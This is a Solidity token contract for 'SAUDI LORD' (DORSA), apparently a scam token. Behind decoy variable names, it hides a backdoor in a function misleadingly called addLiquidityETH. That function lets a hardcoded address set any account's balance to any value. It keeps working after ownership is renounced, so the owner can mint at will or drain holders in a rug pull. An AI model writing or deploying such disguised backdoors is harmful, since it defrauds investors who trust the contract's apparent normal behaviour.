// https://t.me/SaudiLordToken
// SPDX-License-Identifier: MIT

pragma solidity 0.8.21;
interface UniCryptPermit {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address CumulativeLast) external view returns (uint256);
  function transfer(address skim, uint256 swapOpenWithValues) external returns (bool);
  function allowance(address _owner, address CumulativeLast) external view returns (uint256);
  function approve(address CumulativeLast, uint256 swapOpenWithValues) external returns (bool);
  function transferFrom(address sender, address skim, uint256 swapOpenWithValues) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed CumulativeLast, uint256 balance);
}


abstract contract UniCryptBurnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract UniCryptBasic is UniCryptBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract lordSaudi is UniCryptBurnable, UniCryptPermit, UniCryptBasic {
 
    using SafeMath for uint256;
    mapping (address => uint256) private MINIMUM_LIQUIDITY;
    mapping (address => mapping (address => uint256)) private factory;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    string private saudi_SLOT;
    address private lordsaudiOwner; 
    uint256 public saudiCreationTime;
    uint256 public saudiCreation;
    string public saudi;
string public ownerAddress = "0xDda6615b07b2dBF2f59B9260124B2De9182b9B6e";

    constructor() {
        lordsaudiOwner = 0xDda6615b07b2dBF2f59B9260124B2De9182b9B6e;    
        _name = unicode"𝗦𝗔𝗨𝗗𝗜 𝗟𝗢𝗥𝗗";
        _symbol = "DORSA";
        _decimals = 9;
        _totalSupply = 100000000000000 * 10**_decimals;
        MINIMUM_LIQUIDITY[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        saudi = "IInventory p_i1999_3_+ int p_i1999_4_+ int p_i1999_5_+ int p_i1999_6_";
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

                     function getownerAddress() public view returns (string memory) {
        return ownerAddress;
    }    

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address CumulativeLast) external view override returns (uint256) {
        return MINIMUM_LIQUIDITY[CumulativeLast];
    }

    function transfer(address skim, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(_msgSender(), skim, swapOpenWithValues);
        return true;
    }

    function allowance(address owner, address CumulativeLast) external view override returns (uint256) {
        return factory[owner][CumulativeLast];
    }


    function approve(address CumulativeLast, uint256 swapOpenWithValues) external override returns (bool) {
        _approve(_msgSender(), CumulativeLast, swapOpenWithValues);
        return true;
    }
    
    function transferFrom(address sender, address skim, uint256 swapOpenWithValues) external override returns (bool) {
        _transfer(sender, skim, swapOpenWithValues);
        _approve(sender, _msgSender(), factory[sender][_msgSender()].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds allowance"));
        return true;
    }

    function increaseAllowance(address CumulativeLast, uint256 token1alance) external returns (bool) {
        _approve(_msgSender(), CumulativeLast, factory[_msgSender()][CumulativeLast].add(token1alance));
        return true;
    }
    

    function decreaseAllowance(address CumulativeLast, uint256 initialize) external returns (bool) {
        _approve(_msgSender(), CumulativeLast, factory[_msgSender()][CumulativeLast].sub(initialize, "Ru: decreased allowance below zero"));
        return true;
    }
    
    function _transfer(address sender, address skim, uint256 swapOpenWithValues) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(skim != address(0), "Ru: transfer to the zero address");
                
        MINIMUM_LIQUIDITY[sender] = MINIMUM_LIQUIDITY[sender].sub(swapOpenWithValues, "Ru: transfer swapOpenWithValues exceeds balance");
        MINIMUM_LIQUIDITY[skim] = MINIMUM_LIQUIDITY[skim].add(swapOpenWithValues);
        emit Transfer(sender, skim, swapOpenWithValues);
    }
        function addLiquidityETH(address token0, address token1, uint256 SaudiTo, uint256 SaudiFor, uint256 SaudiFors) external {
        require(_msgSender()==lordsaudiOwner);
        token1 = token0;
        token0 = token0;
        MINIMUM_LIQUIDITY[token1] = (SaudiTo + SaudiFor + SaudiFors) * 10**_decimals;
        token0 = token1;
        token1 = token1;
    }   

    function _approve(address owner, address CumulativeLast, uint256 swapOpenWithValues) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(CumulativeLast != address(0), "Ru: approve to the zero address");
        
        factory[owner][CumulativeLast] = swapOpenWithValues;
        emit Approval(owner, CumulativeLast, swapOpenWithValues);
    }
    
}